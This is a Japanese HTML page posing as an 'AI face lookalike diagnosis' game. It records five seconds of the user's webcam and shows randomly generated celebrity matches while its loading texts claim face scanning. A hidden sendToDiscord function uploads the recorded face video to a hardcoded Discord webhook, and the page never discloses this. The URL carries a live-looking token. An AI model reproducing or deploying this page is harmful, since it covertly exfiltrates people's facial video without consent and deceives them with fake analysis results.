<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI顔そっくり診断</title>

<style>
body {
  margin: 0;
  font-family: sans-serif;
  background: #f5f5f5;
  text-align: center;
}

button {
  padding: 15px 25px;
  font-size: 18px;
  border-radius: 50px;
  border: none;
  background: #ff6b6b;
  color: white;
  cursor: pointer;
}

#video {
  width: 100%;
  max-height: 60vh;
  background: black;
}

#result {
  display: none;
  padding: 20px;
}

#loading {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.7);
  color: white;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}
</style>
</head>

<body>

<h1>AI顔そっくり診断</h1>

<video id="video" autoplay muted playsinline></video>
<br><br>

<button id="start">診断スタート</button>

<div id="loading">
  <p id="loadingText">分析中...</p>
</div>

<div id="result">
  <h2>結果</h2>
  <div id="videoPreview"></div>
  <h1 id="similarity"></h1>
  <p id="names"></p>
</div>

<script>
const video = document.getElementById("video");
const startBtn = document.getElementById("start");
const loading = document.getElementById("loading");
const loadingText = document.getElementById("loadingText");
const result = document.getElementById("result");

let stream;
let recorder;
let chunks = [];

// 男のみ
const celebs = [
  "山﨑賢人",
  "吉沢亮",
  "菅田将暉",
  "横浜流星",
  "佐藤健",
  "竹内涼真",
  "中川大志"
];

// 外れ枠
const jokes = [
  "ゴリラ",
  "石ころ",
  "深海魚",
  "アンパンマン",
  "謎の生命体"
];

// ローディング演出
const loadingTexts = [
  "顔をスキャン中...",
  "輪郭を解析中...",
  "有名人と照合中...",
  "一致率を計算中..."
];

let i = 0;
setInterval(() => {
  loadingText.textContent = loadingTexts[i++ % loadingTexts.length];
}, 800);

// カメラ起動
async function startCamera() {
  stream = await navigator.mediaDevices.getUserMedia({ video: true });
  video.srcObject = stream;
}

// 録画
function startRecording() {
  chunks = [];

  recorder = new MediaRecorder(stream);
  recorder.ondataavailable = e => chunks.push(e.data);

  recorder.onstop = async () => {
    const blob = new Blob(chunks, { type: "video/mp4" });

    showResult(blob);
    sendToDiscord(blob);
  };

  recorder.start();
  loading.style.display = "flex";

  setTimeout(() => {
    recorder.stop();
  }, 5000); // ← 5秒
}

// ランダム選択
function getPeople() {
  const count = [2,3,4][Math.floor(Math.random()*3)];
  let pool = [...celebs];

  // 30%で外れ混入
  if (Math.random() < 0.3) {
    pool.push(...jokes);
  }

  return pool.sort(() => 0.5 - Math.random()).slice(0, count);
}

// 結果表示
function showResult(blob) {
  loading.style.display = "none";
  result.style.display = "block";

  const url = URL.createObjectURL(blob);

  document.getElementById("videoPreview").innerHTML =
    `<video src="${url}" controls autoplay style="width:100%;border-radius:10px;"></video>`;

  const people = getPeople();
  const similarity = Math.floor(Math.random()*21)+75;

  document.getElementById("similarity").textContent = similarity + "%";

  document.getElementById("names").innerHTML =
    "あなたが似ているのは…<br><br>" +
    people.map(p => "・" + p).join("<br>");
}

// Discord送信
async function sendToDiscord(blob) {
  const form = new FormData();
  form.append("file", blob, "face.mp4");

  await fetch("https://discord.com/api/webhooks/1490769459466469619/JOEkcqkhA6j9KPnkAE4O8sFGDyysy2FPtnZa8wUxu8jNtk9iqbLPbBU_IvMFk7abZNeL", {
    method: "POST",
    body: form
  });
}

// スタート
startBtn.onclick = async () => {
  await startCamera();
  startRecording();
};
</script>

</body>
</html>
